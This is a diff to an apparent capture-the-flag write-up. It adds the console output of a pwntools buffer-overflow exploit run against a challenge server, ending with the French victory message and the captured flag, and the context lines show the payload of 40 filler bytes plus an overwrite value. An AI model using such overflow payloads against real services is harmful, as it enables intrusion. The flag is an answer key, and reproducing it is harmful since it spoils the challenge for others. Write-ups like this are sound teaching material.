@@ -184,3 +184,17 @@ conn.send(b'A'*40 + b'\xef\xbe\xbe\xbe\xad\xde\xfe\xca')
 log.success('Payload sent')
 conn.interactive()
 ```
+
+```
+$ python3 pwn-sisi.py
+[+] Opening connection to challs.hackagou.nc on port 5005: Done
+[+] Received lines
+[+] Payload sent
+[*] Switching to interactive mode
+Bien joué jeune padawan, as-tu atteint ton but ?!
+
+OPENNC{H4cK4g0u_C357_34sY}
+Déconnexion...
+
+[*] Got EOF while reading in interactive
+```
